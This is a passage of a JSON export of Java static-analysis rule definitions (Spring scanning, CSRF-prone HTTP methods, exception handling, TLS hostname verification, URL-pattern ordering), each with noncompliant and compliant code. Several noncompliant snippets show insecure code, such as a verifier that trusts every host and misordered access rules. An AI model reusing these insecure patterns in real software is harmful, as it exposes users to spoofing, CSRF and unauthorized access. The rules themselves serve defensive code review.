            "mdDesc": "<p><code>@ComponentScan</code> is used to determine which Spring Beans are available in the application context. The packages to scan can be\nconfigured thanks to the <code>basePackageClasses</code> or <code>basePackages</code> (or its alias <code>value</code>) parameters. If neither\nparameter is configured, <code>@ComponentScan</code> will consider only the package of the class annotated with it. When <code>@ComponentScan</code>\nis used on a class belonging to the default package, the entire classpath will be scanned.</p>\n<p>This will slow-down the start-up of the application and it is likely the application will fail to start with an\n<code>BeanDefinitionStoreException</code> because you ended up scanning the Spring Framework package itself.</p>\n<p>This rule raises an issue when:</p>\n<p>- <code>@ComponentScan</code>, <code>@SpringBootApplication</code> and <code>@ServletComponentScan</code> are used on a class belonging to the\ndefault package</p>\n<p>- <code>@ComponentScan</code> is explicitly configured with the default package</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nimport org.springframework.boot.SpringApplication;\n\n@SpringBootApplication // Noncompliant; RootBootApp is declared in the default package\npublic class RootBootApp {\n...\n}\n</pre>\n<pre>\n@ComponentScan(\"\")\npublic class Application {\n...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npackage hello;\n\nimport org.springframework.boot.SpringApplication;\n\n@SpringBootApplication // Compliant; RootBootApp belongs to the \"hello\" package\npublic class RootBootApp {\n...\n}\n</pre>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S3752",
            "repo": "java",
            "name": "Allowing both safe and unsafe HTTP methods is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>An HTTP method is safe when used to perform a read-only operation, such as retrieving information. In contrast, an unsafe HTTP method is used to\nchange the state of an application, for instance to update a user's profile on a web application.</p>\n<p>Common safe HTTP methods are GET, HEAD, or OPTIONS.</p>\n<p>Common unsafe HTTP methods are POST, PUT and DELETE.</p>\n<p>Allowing both safe and unsafe HTTP methods to perform a specific operation on a web application could impact its security, for example CSRF\nprotections are most of the time only protecting operations performed by unsafe HTTP methods.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> HTTP methods are not defined at all for a route/controller of the application. </li>\n  <li> Safe HTTP methods are defined and used for a route/controller that can change the state of an application. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>For all the routes/controllers of an application, the authorized HTTP methods should be explicitly defined and safe HTTP methods should only be\nused to perform read-only operations.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n@RequestMapping(\"/delete_user\")  // Sensitive: by default all HTTP methods are allowed\npublic String delete1(String username) {\n// state of the application will be changed here\n}\n\n@RequestMapping(path = \"/delete_user\", method = {RequestMethod.GET, RequestMethod.POST}) // Sensitive: both safe and unsafe methods are allowed\nString delete2(@RequestParam(\"id\") String id) {\n// state of the application will be changed here\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@RequestMapping(\"/delete_user\", method = RequestMethod.POST)  // Compliant\npublic String delete1(String username) {\n// state of the application will be changed here\n}\n\n@RequestMapping(path = \"/delete_user\", method = RequestMethod.POST) // Compliant\nString delete2(@RequestParam(\"id\") String id) {\n// state of the application will be changed here\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control\">OWASP Top 10 2017 Category A5</a> -\n  Broken Access Control </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/352.html\">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29\">OWASP: Cross-Site Request Forgery</a> </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat1\">SANS Top 25</a> - Insecure Interaction Between Components </li>\n  <li> <a href=\"https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/csrf.html#csrf-use-proper-verbs\">Spring Security Official\n  Documentation: Use proper HTTP verbs (CSRF protection)</a> </li>\n</ul>",
            "mdDesc": "<p>An HTTP method is safe when used to perform a read-only operation, such as retrieving information. In contrast, an unsafe HTTP method is used to\nchange the state of an application, for instance to update a user's profile on a web application.</p>\n<p>Common safe HTTP methods are GET, HEAD, or OPTIONS.</p>\n<p>Common unsafe HTTP methods are POST, PUT and DELETE.</p>\n<p>Allowing both safe and unsafe HTTP methods to perform a specific operation on a web application could impact its security, for example CSRF\nprotections are most of the time only protecting operations performed by unsafe HTTP methods.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> HTTP methods are not defined at all for a route/controller of the application. </li>\n  <li> Safe HTTP methods are defined and used for a route/controller that can change the state of an application. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>For all the routes/controllers of an application, the authorized HTTP methods should be explicitly defined and safe HTTP methods should only be\nused to perform read-only operations.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n@RequestMapping(\"/delete_user\")  // Sensitive: by default all HTTP methods are allowed\npublic String delete1(String username) {\n// state of the application will be changed here\n}\n\n@RequestMapping(path = \"/delete_user\", method = {RequestMethod.GET, RequestMethod.POST}) // Sensitive: both safe and unsafe methods are allowed\nString delete2(@RequestParam(\"id\") String id) {\n// state of the application will be changed here\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@RequestMapping(\"/delete_user\", method = RequestMethod.POST)  // Compliant\npublic String delete1(String username) {\n// state of the application will be changed here\n}\n\n@RequestMapping(path = \"/delete_user\", method = RequestMethod.POST) // Compliant\nString delete2(@RequestParam(\"id\") String id) {\n// state of the application will be changed here\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control\">OWASP Top 10 2017 Category A5</a> -\n  Broken Access Control </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/352.html\">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29\">OWASP: Cross-Site Request Forgery</a> </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat1\">SANS Top 25</a> - Insecure Interaction Between Components </li>\n  <li> <a href=\"https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/csrf.html#csrf-use-proper-verbs\">Spring Security Official\n  Documentation: Use proper HTTP verbs (CSRF protection)</a> </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a5",
                "sans-top25-insecure",
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S1696",
            "repo": "java",
            "name": "\"NullPointerException\" should not be caught",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>NullPointerException</code> should be avoided, not caught. Any situation in which <code>NullPointerException</code> is explicitly caught can\neasily be converted to a <code>null</code> test, and any behavior being carried out in the catch block can easily be moved to the \"is null\" branch of\nthe conditional.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic int lengthPlus(String str) {\n  int len = 2;\n  try {\n    len += str.length();\n  }\n  catch (NullPointerException e) {\n    log.info(\"argument was null\");\n  }\n  return len;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic int lengthPlus(String str) {\n  int len = 2;\n\n  if (str != null) {\n    len += str.length();\n  }\n  else {\n    log.info(\"argument was null\");\n  }\n  return len;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/395.html\">MITRE, CWE-395</a> - Use of NullPointerException Catch to Detect NULL Pointer\n  Dereference </li>\n  <li> <a href=\"https://tinyurl.com/y6r4amg3\">CERT, ERR08-J.</a> - Do not catch NullPointerException or any of its ancestors </li>\n</ul>",
            "mdDesc": "<p><code>NullPointerException</code> should be avoided, not caught. Any situation in which <code>NullPointerException</code> is explicitly caught can\neasily be converted to a <code>null</code> test, and any behavior being carried out in the catch block can easily be moved to the \"is null\" branch of\nthe conditional.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic int lengthPlus(String str) {\n  int len = 2;\n  try {\n    len += str.length();\n  }\n  catch (NullPointerException e) {\n    log.info(\"argument was null\");\n  }\n  return len;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic int lengthPlus(String str) {\n  int len = 2;\n\n  if (str != null) {\n    len += str.length();\n  }\n  else {\n    log.info(\"argument was null\");\n  }\n  return len;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/395.html\">MITRE, CWE-395</a> - Use of NullPointerException Catch to Detect NULL Pointer\n  Dereference </li>\n  <li> <a href=\"https://tinyurl.com/y6r4amg3\">CERT, ERR08-J.</a> - Do not catch NullPointerException or any of its ancestors </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "error-handling"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3510",
            "repo": "java",
            "name": "\"HostnameVerifier.verify\" should not always return true",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>To prevent URL spoofing, <code>HostnameVerifier.verify()</code> methods should do more than simply <code>return true</code>. Doing so may get you\nquickly past an exception, but that comes at the cost of opening a security hole in your application. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nSSLContext sslcontext = SSLContext.getInstance( \"TLS\" );\nsslcontext.init(null, new TrustManager[]{new X509TrustManager() {\n  public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}\n  public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}\n  public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n\n}}, new java.security.SecureRandom());\n\nClient client = ClientBuilder.newBuilder().sslContext(sslcontext).hostnameVerifier(new HostnameVerifier() {\n  @Override\n  public boolean verify(String requestedHost, SSLSession remoteServerSession) {\n    return true;  // Noncompliant\n  }\n}).build();\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nSSLContext sslcontext = SSLContext.getInstance( \"TLSv1.2\" );\nsslcontext.init(null, new TrustManager[]{new X509TrustManager() {\n  @Override\n  public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}\n  @Override\n  public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}\n  @Override\n  public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n\n}}, new java.security.SecureRandom());\n\nClient client = ClientBuilder.newBuilder().sslContext(sslcontext).hostnameVerifier(new HostnameVerifier() {\n  @Override\n  public boolean verify(String requestedHost, SSLSession remoteServerSession) {\n    return requestedHost.equalsIgnoreCase(remoteServerSession.getPeerHost()); // Compliant\n  }\n}).build();\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/295.html\">MITRE, CWE-295</a> - Improper Certificate Validation </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#WEAK_HOSTNAME_VERIFIER\">WEAK_HOSTNAME_VERIFIER</a> </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use <a href='/coding_rules#rule_key=java%3AS5527'>S5527</a> instead.</p>",
            "mdDesc": "<p>To prevent URL spoofing, <code>HostnameVerifier.verify()</code> methods should do more than simply <code>return true</code>. Doing so may get you\nquickly past an exception, but that comes at the cost of opening a security hole in your application. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nSSLContext sslcontext = SSLContext.getInstance( \"TLS\" );\nsslcontext.init(null, new TrustManager[]{new X509TrustManager() {\n  public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}\n  public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}\n  public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n\n}}, new java.security.SecureRandom());\n\nClient client = ClientBuilder.newBuilder().sslContext(sslcontext).hostnameVerifier(new HostnameVerifier() {\n  @Override\n  public boolean verify(String requestedHost, SSLSession remoteServerSession) {\n    return true;  // Noncompliant\n  }\n}).build();\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nSSLContext sslcontext = SSLContext.getInstance( \"TLSv1.2\" );\nsslcontext.init(null, new TrustManager[]{new X509TrustManager() {\n  @Override\n  public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}\n  @Override\n  public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}\n  @Override\n  public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n\n}}, new java.security.SecureRandom());\n\nClient client = ClientBuilder.newBuilder().sslContext(sslcontext).hostnameVerifier(new HostnameVerifier() {\n  @Override\n  public boolean verify(String requestedHost, SSLSession remoteServerSession) {\n    return requestedHost.equalsIgnoreCase(remoteServerSession.getPeerHost()); // Compliant\n  }\n}).build();\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/295.html\">MITRE, CWE-295</a> - Improper Certificate Validation </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#WEAK_HOSTNAME_VERIFIER\">WEAK_HOSTNAME_VERIFIER</a> </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use {rule:java:S5527} instead.</p>",
            "severity": "BLOCKER",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S3631",
            "repo": "java",
            "name": "\"Arrays.stream\" should be used for primitive arrays",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>For arrays of objects, <code>Arrays.asList(T ... a).stream()</code> and <code>Arrays.stream(array)</code> are basically equivalent in terms of\nperformance. However, for arrays of primitives, using <code>Arrays.asList</code> will force the construction of a list of boxed types, and then use\n<em>that</em> list as a stream. On the other hand, <code>Arrays.stream</code> uses the appropriate primitive stream type (<code>IntStream</code>,\n<code>LongStream</code>, <code>DoubleStream</code>) when applicable, with much better performance.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nArrays.asList(\"a1\", \"a2\", \"b1\", \"c2\", \"c1\").stream()\n    .filter(...)\n    .forEach(...);\n\nArrays.asList(1, 2, 3, 4).stream() // Noncompliant\n    .filter(...)\n    .forEach(...);\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nArrays.asList(\"a1\", \"a2\", \"b1\", \"c2\", \"c1\").stream()\n    .filter(...)\n    .forEach(...);\n\nint[] intArray = new int[]{1, 2, 3, 4};\nArrays.stream(intArray)\n    .filter(...)\n    .forEach(...);\n</pre>",
            "mdDesc": "<p>For arrays of objects, <code>Arrays.asList(T ... a).stream()</code> and <code>Arrays.stream(array)</code> are basically equivalent in terms of\nperformance. However, for arrays of primitives, using <code>Arrays.asList</code> will force the construction of a list of boxed types, and then use\n<em>that</em> list as a stream. On the other hand, <code>Arrays.stream</code> uses the appropriate primitive stream type (<code>IntStream</code>,\n<code>LongStream</code>, <code>DoubleStream</code>) when applicable, with much better performance.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nArrays.asList(\"a1\", \"a2\", \"b1\", \"c2\", \"c1\").stream()\n    .filter(...)\n    .forEach(...);\n\nArrays.asList(1, 2, 3, 4).stream() // Noncompliant\n    .filter(...)\n    .forEach(...);\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nArrays.asList(\"a1\", \"a2\", \"b1\", \"c2\", \"c1\").stream()\n    .filter(...)\n    .forEach(...);\n\nint[] intArray = new int[]{1, 2, 3, 4};\nArrays.stream(intArray)\n    .filter(...)\n    .forEach(...);\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4601",
            "repo": "java",
            "name": "\"HttpSecurity\" URL patterns should be correctly ordered",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>URL patterns configured on a <code>HttpSecurity.authorizeRequests()</code> method are considered in the order they were declared. It's easy to do a\nmistake and to declare a less restrictive configuration before a more restrictive one. Therefore, it's required to review the order of the\n\"antMatchers\" declarations. The <code>/**</code> one should be the last one if it is declared.</p>\n<p>This rule raises an issue when:</p>\n<p>- A pattern is preceded by another that ends with <code>**</code> and has the same beginning. E.g.: <code>/page*-admin/db/**</code> is after\n<code>/page*-admin/**</code></p>\n<p>- A pattern without wildcard characters is preceded by another that matches. E.g.: <code>/page-index/db</code> is after <code>/page*/**</code></p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n  protected void configure(HttpSecurity http) throws Exception {\n    http.authorizeRequests()\n      .antMatchers(\"/resources/**\", \"/signup\", \"/about\").permitAll() // Compliant\n      .antMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n      .antMatchers(\"/admin/login\").permitAll() // Noncompliant; the pattern \"/admin/login\" should occurs before \"/admin/**\"\n      .antMatchers(\"/**\", \"/home\").permitAll()\n      .antMatchers(\"/db/**\").access(\"hasRole('ADMIN') and hasRole('DBA')\") // Noncompliant; the pattern \"/db/**\" should occurs before \"/**\"\n      .and().formLogin().loginPage(\"/login\").permitAll().and().logout().permitAll();\n  }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n  protected void configure(HttpSecurity http) throws Exception {\n    http.authorizeRequests()\n      .antMatchers(\"/resources/**\", \"/signup\", \"/about\").permitAll() // Compliant\n      .antMatchers(\"/admin/login\").permitAll()\n      .antMatchers(\"/admin/**\").hasRole(\"ADMIN\") // Compliant\n      .antMatchers(\"/db/**\").access(\"hasRole('ADMIN') and hasRole('DBA')\")\n      .antMatchers(\"/**\", \"/home\").permitAll() // Compliant; \"/**\" is the last one\n      .and().formLogin().loginPage(\"/login\").permitAll().and().logout().permitAll();\n  }\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n</ul>",
            "mdDesc": "<p>URL patterns configured on a <code>HttpSecurity.authorizeRequests()</code> method are considered in the order they were declared. It's easy to do a\nmistake and to declare a less restrictive configuration before a more restrictive one. Therefore, it's required to review the order of the\n\"antMatchers\" declarations. The <code>/**</code> one should be the last one if it is declared.</p>\n<p>This rule raises an issue when:</p>\n<p>- A pattern is preceded by another that ends with <code>**</code> and has the same beginning. E.g.: <code>/page*-admin/db/**</code> is after\n<code>/page*-admin/**</code></p>\n<p>- A pattern without wildcard characters is preceded by another that matches. E.g.: <code>/page-index/db</code> is after <code>/page*/**</code></p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n  protected void configure(HttpSecurity http) throws Exception {\n    http.authorizeRequests()\n      .antMatchers(\"/resources/**\", \"/signup\", \"/about\").permitAll() // Compliant\n      .antMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n      .antMatchers(\"/admin/login\").permitAll() // Noncompliant; the pattern \"/admin/login\" should occurs before \"/admin/**\"\n      .antMatchers(\"/**\", \"/home\").permitAll()\n      .antMatchers(\"/db/**\").access(\"hasRole('ADMIN') and hasRole('DBA')\") // Noncompliant; the pattern \"/db/**\" should occurs before \"/**\"\n      .and().formLogin().loginPage(\"/login\").permitAll().and().logout().permitAll();\n  }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n  protected void configure(HttpSecurity http) throws Exception {\n    http.authorizeRequests()\n      .antMatchers(\"/resources/**\", \"/signup\", \"/about\").permitAll() // Compliant\n      .antMatchers(\"/admin/login\").permitAll()\n      .antMatchers(\"/admin/**\").hasRole(\"ADMIN\") // Compliant\n      .antMatchers(\"/db/**\").access(\"hasRole('ADMIN') and hasRole('DBA')\")\n      .antMatchers(\"/**\", \"/home\").permitAll() // Compliant; \"/**\" is the last one\n      .and().formLogin().loginPage(\"/login\").permitAll().and().logout().permitAll();\n  }\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "owasp-a6",
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S1695",
            "repo": "java",
            "name": "\"NullPointerException\" should not be explicitly thrown",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A <code>NullPointerException</code> should indicate that a <code>null</code> value was unexpectedly encountered. Good programming practice dictates\nthat code is structured to avoid NPE's. </p>\n<p>Explicitly throwing <code>NullPointerException</code> forces a method's callers to explicitly catch it, rather than coding to avoid it. Further, it\nmakes it difficult to distinguish between the unexpectedly-encountered <code>null</code> value and the condition which causes the method to purposely\nthrow an NPE.</p>\n<p>If an NPE is being thrown to indicate that a parameter to the method should not have been null, use the <code>@NotNull</code> annotation\ninstead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething (String aString) throws NullPointerException {\n     throw new NullPointerException();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething (@NotNull String aString) {\n}\n</pre>",
            "mdDesc": "<p>A <code>NullPointerException</code> should indicate that a <code>null</code> value was unexpectedly encountered. Good programming practice dictates\nthat code is structured to avoid NPE's. </p>\n<p>Explicitly throwing <code>NullPointerException</code> forces a method's callers to explicitly catch it, rather than coding to avoid it. Further, it\nmakes it difficult to distinguish between the unexpectedly-encountered <code>null</code> value and the condition which causes the method to purposely\nthrow an NPE.</p>\n<p>If an NPE is being thrown to indicate that a parameter to the method should not have been null, use the <code>@NotNull</code> annotation\ninstead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething (String aString) throws NullPointerException {\n     throw new NullPointerException();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething (@NotNull String aString) {\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "error-handling",
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2301",
            "repo": "java",
            "name": "Public methods should not contain selector arguments",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A selector argument is a <code>boolean</code> argument that's used to determine which of two paths to take through a method. Specifying such a\nparameter may seem innocuous, particularly if it's well named. </p>\n<p>Unfortunately, the maintainers of the code calling the method won't see the parameter name, only its value. They'll be forced either to guess at\nthe meaning or to take extra time to look the method up.</p>\n<p>Instead, separate methods should be written.</p>\n<p>This rule finds methods with a <code>boolean</code> that's used to determine which path to take through the method.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic String tempt(String name, boolean ofAge) {\n  if (ofAge) {\n    offerLiquor(name);\n  } else {\n    offerCandy(name);\n  }\n}\n\n// ...\npublic void corrupt() {\n  tempt(\"Joe\", false); // does this mean not to temp Joe?\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void temptAdult(String name) {\n  offerLiquor(name);\n}\n\npublic void temptChild(String name) {\n    offerCandy(name);\n}\n\n// ...\npublic void corrupt() {\n  age &lt; legalAge ? temptChild(\"Joe\") : temptAdult(\"Joe\");\n}\n</pre>",
            "mdDesc": "<p>A selector argument is a <code>boolean</code> argument that's used to determine which of two paths to take through a method. Specifying such a\nparameter may seem innocuous, particularly if it's well named. </p>\n<p>Unfortunately, the maintainers of the code calling the method won't see the parameter name, only its value. They'll be forced either to guess at\nthe meaning or to take extra time to look the method up.</p>\n<p>Instead, separate methods should be written.</p>\n<p>This rule finds methods with a <code>boolean</code> that's used to determine which path to take through the method.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic String tempt(String name, boolean ofAge) {\n  if (ofAge) {\n    offerLiquor(name);\n  } else {\n    offerCandy(name);\n  }\n}\n\n// ...\npublic void corrupt() {\n  tempt(\"Joe\", false); // does this mean not to temp Joe?\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void temptAdult(String name) {\n  offerLiquor(name);\n}\n\npublic void temptChild(String name) {\n    offerCandy(name);\n}\n\n// ...\npublic void corrupt() {\n  age &lt; legalAge ? temptChild(\"Joe\") : temptAdult(\"Joe\");\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "design"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1452",
            "repo": "java",
            "name": "Generic wildcard types should not be used in return types",
            "createdAt": "2022-09-26T07:32:37+0000",
